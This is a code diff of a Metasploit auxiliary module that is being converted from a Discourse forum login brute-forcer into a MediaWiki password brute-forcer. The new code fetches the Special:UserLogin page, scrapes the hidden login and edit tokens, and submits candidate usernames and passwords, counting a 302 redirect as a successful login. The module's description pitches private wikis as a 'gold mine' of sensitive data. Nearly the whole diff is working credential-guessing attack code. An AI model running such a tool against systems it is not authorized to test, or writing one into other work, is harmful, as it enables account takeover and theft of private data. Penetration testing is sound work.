@@ -10,7 +10,7 @@ require 'metasploit/framework/login_scanner/http'
 module Metasploit
   module Framework
     module LoginScanner
-      class Discourse < ::Metasploit::Framework::LoginScanner::HTTP
+      class MediaWikiPassword < ::Metasploit::Framework::LoginScanner::HTTP
         def attempt_login(credential)
           result_opts = {
             credential: credential,
@@ -26,40 +26,38 @@ module Metasploit
             cli.connect
 
             req = cli.request_cgi({
-              'uri' => uri + '/session/csrf',
-              'headers' => {
-                'X-Requested-With' => 'XMLHttpRequest'
-              }
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'index.php?title=Special:UserLogin',
             })
 
             res = cli.send_recv(req)
 
-            if res && res.code == 200
-              cookie = res.get_cookies
+            cookie = res.get_cookies
 
-              csrf = JSON.parse(res.body)["csrf"]
+            edit_token = $1 if res.body =~ /id="wpEditToken" type="hidden" value="(.*?)"/
+            login_token = $1 if res.body =~ /name="wpLoginToken" type="hidden" value="(.*?)"/
 
-              req = cli.request_cgi({
-                'uri' => uri + '/session',
-                'method' => 'POST',
-                'headers' => {
-                  'X-CSRF-TOKEN' => csrf,
-                  'X-Requested-With' => 'XMLHttpRequest'
-                },
-                'vars_post' => {
-                  'login' => credential.public,
-                  'password' => credential.private
-                },
-                'cookie' => cookie
-              })
+            req = cli.request_cgi({
+              'method' => 'POST',
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'index.php?title=Special:UserLogin',
+              'vars_post' => {
+                'wpName' => credential.public,
+                'wpPassword' => credential.private,
+                'authAction' => 'login',
+                'wpLoginToken' => login_token,
+                'wpEditToken' => edit_token,
+                'wploginattempt' => 'Log in',
+                'title' => 'Special:UserLogin',
+                'force' => ''
+              },
+              'cookie' => cookie
+            })
 
-              res = cli.send_recv(req)
+            res = cli.send_recv(req)
 
-              if res && res.body =~ /"error":/
-                result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
-              elsif res && res.body =~ /user_badges/
-                result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
-              end
+            if res.code == 302
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
+            else
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
             end
           rescue Exception => e
             result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
@@ -82,13 +80,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-        'Name'           => 'Discourse Forums Bruteforce',
+        'Name'           => 'MediaWiki Password Bruteforce',
         'Description'    => %q(
-        This module bruteforces Discourse Forums credentials.
+        This module attempts to bruteforce valid credentials on a MediaWiki instance.
 
-        Discourse is an open source forum project written in Ruby.
-        Weak credentials may yield deeper access into protected forums
-        or administrative functionality.
+        MediaWiki is a popular open-source content management system and collaborative
+        wiki used by busineses, non-profits, and hobbyists alike. Internal or private
+        wikis can be a gold mine of sensitive information, high value targets,
+        or network credentials. This is was tested agains 1.28.1.
 
         Categories: Open Source
 
@@ -127,7 +126,7 @@ class MetasploitModule < Msf::Auxiliary
       user_as_pass: datastore['USER_AS_PASS']
     )
 
-    scanner = Metasploit::Framework::LoginScanner::Discourse.new(
+    scanner = Metasploit::Framework::LoginScanner::MediaWikiPassword.new(
       configure_http_login_scanner(
         host: ip,
         port: datastore['RPORT'],
